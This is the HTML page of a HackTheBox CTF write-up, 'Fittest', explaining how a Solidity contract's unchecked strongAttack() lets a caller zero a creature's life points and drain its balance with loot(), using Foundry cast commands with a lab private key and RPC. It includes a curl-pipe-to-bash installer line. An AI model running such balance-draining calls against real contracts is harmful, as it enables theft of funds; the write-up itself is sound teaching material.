@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="preload" href="/assets/fonts/oxanium-variable.ttf" as="font" type="font/ttf" crossorigin />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    
+    
+    <meta name="author" content="Gianluca Bassani" />
+
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    <!-- Single Page App redirect receiver for GitHub Pages -->
+    <script type="text/javascript">
+      (function(l) {
+        if (l.search[1] === '/' ) {
+          var decoded = l.search.slice(1).split('&').map(function(s) { 
+            return s.replace(/~and~/g, '&')
+          }).join('?');
+          window.history.replaceState(null, null,
+              l.pathname.slice(0, -1) + decoded + l.hash
+          );
+        }
+      }(window.location))
+    </script>
+    <script type="module" crossorigin src="/assets/index-Bt1iUacl.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFjX5Hv_.css">
+  
+    <link rel="stylesheet" href="/assets/ArticlePage-BEHUn5zE.css" />
+    <title>Fittest | Gianluca Bassani</title>
+    <meta name="description" content="Defeat a vulnerable smart‑contract creature by reducing its life points and looting its balance using a single strong attack." />
+    <link rel="canonical" href="https://gianlucabassani.gitlab.io/ctf/fittest/" />
+    <meta property="og:title" content="Fittest | Gianluca Bassani" />
+    <meta property="og:description" content="Defeat a vulnerable smart‑contract creature by reducing its life points and looting its balance using a single strong attack." />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://gianlucabassani.gitlab.io/ctf/fittest/" />
+    <meta property="og:site_name" content="Gianluca Bassani" />
+    <meta property="og:image" content="https://gianlucabassani.gitlab.io/assets/previews/ctf-fittest.png" />
+    <meta property="og:image:alt" content="Fittest | Gianluca Bassani" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="article:published_time" content="2025-11-16" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Fittest | Gianluca Bassani" />
+    <meta name="twitter:description" content="Defeat a vulnerable smart‑contract creature by reducing its life points and looting its balance using a single strong attack." />
+    <meta name="twitter:image" content="https://gianlucabassani.gitlab.io/assets/previews/ctf-fittest.png" />
+    <meta name="twitter:image:alt" content="Fittest | Gianluca Bassani" />
+</head>
+
+  <body>
+    <div id="root"><a class="skip-link" href="#route-content">Skip to content</a><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><header class="site-navigation"><svg class="site-navigation-frame site-navigation-frame-desktop" viewBox="0 0 1200 88" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M20 1H1167L1199 25V69H440L422 87H1V20Z"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M20 1H1167L1199 25V69H440L422 87H1V20Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><svg class="site-navigation-frame site-navigation-frame-mobile" viewBox="0 0 400 82" preserveAspectRatio="none" aria-hidden="true"><path class="site-navigation-surface" d="M10 1H389L399 11V73L391 81H1V10Z"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-3;--trace-next:-40;--trace-last:-74;stroke-dasharray:2.8 97.2;animation-duration:8.3s;animation-delay:-2.1s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-17;--trace-next:-54;--trace-last:-88;stroke-dasharray:1.4 98.6;animation-duration:11.7s;animation-delay:-7.6s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-31;--trace-next:-68;--trace-last:-2;stroke-dasharray:3.6 96.4;animation-duration:9.1s;animation-delay:-4.8s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-44;--trace-next:-81;--trace-last:-15;stroke-dasharray:1.8 98.2;animation-duration:13.3s;animation-delay:-9.2s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-53;--trace-next:-90;--trace-last:-24;stroke-dasharray:2.4 97.6;animation-duration:7.7s;animation-delay:-1.3s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:270 90% 78%;--trace-start:-66;--trace-next:-3;--trace-last:-37;stroke-dasharray:3.2 96.8;animation-duration:10.9s;animation-delay:-6.4s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:185 90% 70%;--trace-start:-78;--trace-next:-15;--trace-last:-49;stroke-dasharray:1.2 98.8;animation-duration:12.7s;animation-delay:-3.5s"></path><path class="site-navigation-trace" d="M10 1H389L399 11V73L391 81H1V10Z" pathLength="100" style="--trace-color:325 90% 74%;--trace-start:-88;--trace-next:-25;--trace-last:-59;stroke-dasharray:2.1 97.9;animation-duration:9.7s;animation-delay:-8.1s"></path></svg><div class="site-navigation-inner"><a class="site-brand" aria-label="Gianluca Bassani home" href="/"><span class="site-brand-copy"><span class="site-brand-name">Gianluca<span class="site-brand-break"><br/></span> Bassani</span><small><strong>0xPr1m3</strong><span class="site-brand-separator" aria-hidden="true">·</span><span class="site-brand-role">Cybersecurity</span></small></span></a><button class="site-menu-toggle" type="button" aria-controls="site-menu" aria-expanded="false" aria-label="Open navigation"><svg xmlns="http://www.w3.org/2000/svg" width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><nav id="site-menu" aria-label="Main navigation" class="site-menu"><a href="/about">About Me</a><a href="/projects">Projects</a><a href="/blog">Blog</a><a href="/boxes">Box Writeups</a><a aria-current="page" href="/ctf">CTF Solves</a><a href="/skills">Skills</a><a class="site-console-link" href="/terminal">CLI <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up-right" aria-hidden="true"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></nav></div></header><div id="route-content" tabindex="-1"><!--$--><div class="min-h-screen bg-background cyber-grid reader-page relative"><div aria-hidden="true" class="page-ambient page-ambient-scattered" style="--ambient-primary:hsl(38,92%,50%);--ambient-secondary:hsl(45,93%,58%);--ambient-tertiary:hsl(38,92%,50%)"></div><div class="fixed top-0 left-0 w-full h-1 bg-muted z-50"><div class="h-full bg-gradient-yellow transition-all duration-100" style="width:0%"></div></div><div class="bg-background/80 backdrop-blur-sm border-b border-border relative z-10"><div class="reader-header mx-auto px-4 py-4"><div class="article-navigation"><nav aria-label="Article navigation"><a class="site-button inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 site-button-outline min-h-11 px-4 py-2 article-back-link" data-size="default" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left" aria-hidden="true"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Home</a></nav><div class="article-reading-tools"><span><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2<!-- --> min read</span><button type="button"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-link" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>Copy link</button><span role="status"></span></div></div><div class="flex flex-wrap items-center gap-x-4 gap-y-2 mb-4"><div class="inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 hover:bg-secondary/15 tag bg-success/20 border-success/40 text-success">EASY</div><span class="text-2xl">⛓️</span><span class="text-sm text-muted-foreground font-mono">100<!-- --> pts</span></div><h1 class="text-2xl sm:text-3xl font-display font-bold reader-title mb-2">Fittest</h1><div class="flex flex-wrap items-center gap-x-4 gap-y-2 text-sm text-muted-foreground"><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar w-4 h-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg>16 Nov 2025</div><div class="flex items-center gap-1"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-trophy w-4 h-4"><path d="M6 9H4.5a2.5 2.5 0 0 1 0-5H6"></path><path d="M18 9h1.5a2.5 2.5 0 0 0 0-5H18"></path><path d="M4 22h16"></path><path d="M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22"></path><path d="M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22"></path><path d="M18 2H6v7a6 6 0 0 0 12 0V2Z"></path></svg>HackTheBox</div></div></div></div><main id="main-content" class="reader-layout reader-container mx-auto relative z-10 " tabindex="-1"><aside class="reader-sidebar"><div class="reader-toc reader-toc-desktop"><p>On this page</p><nav aria-label="Article chapters"><a href="#section-description" class="">Description</a><a href="#section-knowledge" class="">Knowledge</a><a href="#section-installing-foundry" class="">Installing Foundry</a><a href="#section-provided-connection-data" class="">Provided Connection Data</a><a href="#section-challenge-code-analysis" class="">Challenge Code Analysis</a><a href="#section-setupsol" class="">Setup.sol</a><a href="#section-creaturesol" class="">Creature.sol</a><a href="#section-exploitation-logic" class="">Exploitation Logic</a><a href="#section-using-foundry-cast-for-contract-interaction" class="">Using Foundry (cast) for Contract Interaction</a><a href="#section-step-1-deal-20-damage" class="">Step 1 — Deal 20 Damage</a><a href="#section-step-2-loot-the-creature" class="">Step 2 — Loot the Creature</a><a href="#section-final-step-retrieve-the-flag" class="">Final Step — Retrieve the Flag</a></nav></div><details class="reader-toc reader-toc-mobile"><summary>On this page <span>12<!-- --> chapters</span></summary><nav aria-label="Article chapters"><a href="#section-description" class="">Description</a><a href="#section-knowledge" class="">Knowledge</a><a href="#section-installing-foundry" class="">Installing Foundry</a><a href="#section-provided-connection-data" class="">Provided Connection Data</a><a href="#section-challenge-code-analysis" class="">Challenge Code Analysis</a><a href="#section-setupsol" class="">Setup.sol</a><a href="#section-creaturesol" class="">Creature.sol</a><a href="#section-exploitation-logic" class="">Exploitation Logic</a><a href="#section-using-foundry-cast-for-contract-interaction" class="">Using Foundry (cast) for Contract Interaction</a><a href="#section-step-1-deal-20-damage" class="">Step 1 — Deal 20 Damage</a><a href="#section-step-2-loot-the-creature" class="">Step 2 — Loot the Creature</a><a href="#section-final-step-retrieve-the-flag" class="">Final Step — Retrieve the Flag</a></nav></details></aside><div class="reader-body"><section class="reader-summary" aria-label="Article introduction"><p class="reader-summary-text">Defeat a vulnerable smart‑contract creature by reducing its life points and looting its balance using a single strong attack.</p><ul class="reader-summary-topics" aria-label="Topics"><li>Solidity</li><li>Smart Contracts</li><li>Foundry</li><li>EVM</li></ul></section><div style="--hover-theme:var(--theme-yellow)" class="rounded-lg border bg-card text-card-foreground shadow-sm relative overflow-hidden reader-article theme-yellow border-yellow-500/20 hover:ring-1 hover:ring-yellow-500/20"><div class="p-6 pt-0 reader-content"><div class="prose prose-invert prose-yellow reader-prose"><hr/>
+<h2 id="section-description"><a href="#section-description" class="heading-link">Description</a></h2>
+<p>Alex had always dreamed of becoming a warrior, but she wasn&#x27;t particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.</p>
+<hr/>
+<h2 id="section-knowledge"><a href="#section-knowledge" class="heading-link">Knowledge</a></h2>
+<p><strong>Solidity</strong> is the dominant language for writing smart contracts on EVM-based chains.</p>
+<p>To interact with the challenge contracts we require:</p>
+<ul>
+<li>
+<p>A <strong>private key</strong></p>
+</li>
+<li>
+<p>The <strong>contract address</strong> we want to interact with</p>
+</li>
+<li>
+<p>A valid <strong>RPC endpoint</strong></p>
+</li>
+</ul>
+<hr/>
+<h2 id="section-installing-foundry"><a href="#section-installing-foundry" class="heading-link">Installing Foundry</a></h2>
+<p>Foundry is a smart-contract development and interaction toolkit. It allows dependency management, compilation, testing, deploying, and on-chain interaction via CLI tools like <code>cast</code>.</p>
+<p>Official page: <a href="https://getfoundry.sh/introduction/installation">https://getfoundry.sh/introduction/installation</a></p>
+<p>Installation:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">curl -L https://foundry.paradigm.xyz | bash
+</code></pre></div>
+<hr/>
+<h2 id="section-provided-connection-data"><a href="#section-provided-connection-data" class="heading-link">Provided Connection Data</a></h2>
+<p>From <code>/connection</code>:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>json</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="json block, horizontally scrollable"><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">&quot;PrivateKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;Address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;TargetAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;setupAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0xf0Bc69214C06B85b67e36363b716fBe16B9d4f37&quot;</span>
+<span class="hljs-punctuation">}</span>
+</code></pre></div>
+<hr/>
+<h2 id="section-challenge-code-analysis"><a href="#section-challenge-code-analysis" class="heading-link">Challenge Code Analysis</a></h2>
+<h2 id="section-setupsol"><a href="#section-setupsol" class="heading-link">Setup.sol</a></h2>
+<p>Key points:</p>
+<ul>
+<li>
+<p>Deploys a <code>Creature</code> contract.</p>
+</li>
+<li>
+<p>Sends 1 ether into the challenge.</p>
+</li>
+<li>
+<p>Challenge is solved when the <code>Creature</code> contract balance reaches 0.</p>
+</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>solidity</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="solidity block, horizontally scrollable"><code class="hljs language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Creature} from &quot;./Creature.sol&quot;;
+
+contract Setup {
+    Creature public immutable TARGET;
+
+    constructor() payable {
+        require(msg.value == 1 ether);
+        TARGET = new Creature{value: 10}();
+    }
+    
+    function isSolved() public view returns (bool) {
+        return address(TARGET).balance == 0;
+    }
+}
+</code></pre></div>
+<hr/>
+<h2 id="section-creaturesol"><a href="#section-creaturesol" class="heading-link">Creature.sol</a></h2>
+<p>This contract is the “monster” to defeat.</p>
+<p>Important mechanics:</p>
+<ul>
+<li>
+<p>Starts with <strong>20 life points (LP)</strong>.</p>
+</li>
+<li>
+<p>You reduce LP via:</p>
+<ul>
+<li>
+<p><code>punch()</code> → 1 damage</p>
+</li>
+<li>
+<p><code>strongAttack(uint256 dmg)</code> → custom damage</p>
+</li>
+</ul>
+</li>
+<li>
+<p>After LP reaches zero, <code>loot()</code> transfers the contract’s entire balance to you.</p>
+</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>solidity</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="solidity block, horizontally scrollable"><code class="hljs language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract Creature {
+    
+    uint256 public lifePoints;
+    address public aggro;
+
+    constructor() payable {
+        lifePoints = 20;
+    }
+
+    function strongAttack(uint256 _damage) external{
+        _dealDamage(_damage);
+    }
+    
+    function punch() external {
+        _dealDamage(1);
+    }
+
+    function loot() external {
+        require(lifePoints == 0, &quot;Creature is still alive!&quot;);
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function _dealDamage(uint256 _damage) internal {
+        aggro = msg.sender;
+        lifePoints -= _damage;
+    }
+}
+</code></pre></div>
+<hr/>
+<h2 id="section-exploitation-logic"><a href="#section-exploitation-logic" class="heading-link">Exploitation Logic</a></h2>
+<p>To win:</p>
+<ol>
+<li>
+<p>Reduce <code>lifePoints</code> from <strong>20 → 0</strong>.<br/>
+<!-- -->Instead of calling <code>punch()</code> twenty times, use <code>strongAttack()</code> with a single large damage value.</p>
+</li>
+<li>
+<p>Once <code>lifePoints == 0</code>, call <code>loot()</code> to drain the contract balance.</p>
+</li>
+</ol>
+<hr/>
+<h2 id="section-using-foundry-cast-for-contract-interaction"><a href="#section-using-foundry-cast-for-contract-interaction" class="heading-link">Using Foundry (<code>cast</code>) for Contract Interaction</a></h2>
+<p><code>cast send</code> allows sending state-changing transactions and signing them with your private key:</p>
+<p>General form:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>cast send &lt;contract&gt; &quot;&lt;function()&gt;&quot; --rpc-url &lt;RPC&gt; --private-key &lt;PK&gt;
+</code></pre></div>
+<p>With arguments:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>cast send &lt;contract&gt; &quot;&lt;function(type)&gt;&quot; &lt;arg&gt; --rpc-url &lt;RPC&gt; --private-key &lt;PK&gt;
+</code></pre></div>
+<hr/>
+<h2 id="section-step-1-deal-20-damage"><a href="#section-step-1-deal-20-damage" class="heading-link">Step 1 — Deal 20 Damage</a></h2>
+<p>Command:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">cast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \
+<span class="hljs-string">&quot;strongAttack(uint256)&quot;</span> 20 \
+--rpc-url http://83.136.255.53:42964/rpc \
+--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>blockHash            0xb2c70ba1271d365ca1d3995ccc0cd409c41d3a5b908d234718b69884c6a635c4  
+blockNumber          2  
+contractAddress         
+cumulativeGasUsed    43933  
+effectiveGasPrice    1  
+from                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  
+gasUsed              43933  
+logs                 []  
+logsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+root                    
+status               1 (success)  
+transactionHash      0xed34430fa0cddc41e1a419e12ba2167ceb22d6cd1fa739e7cee18fe91460e165  
+transactionIndex     0  
+type                 2  
+blobGasPrice         1  
+blobGasUsed             
+to                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  
+root                 1130364050475552944130524530114546590354513137440874816785034123020356937009
+</code></pre></div>
+<p>Successful transaction output confirms the LP reduction.</p>
+<hr/>
+<h2 id="section-step-2-loot-the-creature"><a href="#section-step-2-loot-the-creature" class="heading-link">Step 2 — Loot the Creature</a></h2>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">cast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \
+<span class="hljs-string">&quot;loot()&quot;</span> \
+--rpc-url http://83.136.255.53:42964/rpc \
+--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>blockHash            0x6a819605e299a550b2edbcdab61bc74338a90201e423d11ed8ebffb19ff76b10  
+blockNumber          3  
+contractAddress         
+cumulativeGasUsed    30240  
+effectiveGasPrice    1  
+from                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  
+gasUsed              30240  
+logs                 []  
+logsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+root                    
+status               1 (success)  
+transactionHash      0x5f643659598d0257324a195c9340280a399dabe12d8f211c7da76c7ca126499c  
+transactionIndex     0  
+type                 2  
+blobGasPrice         1  
+blobGasUsed             
+to                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  
+root                 65448156146837092794561661644493978257801831892458926913137380377893969569969
+</code></pre></div>
+<p>This transfers the remaining ether to your address, satisfying the challenge condition.</p>
+<hr/>
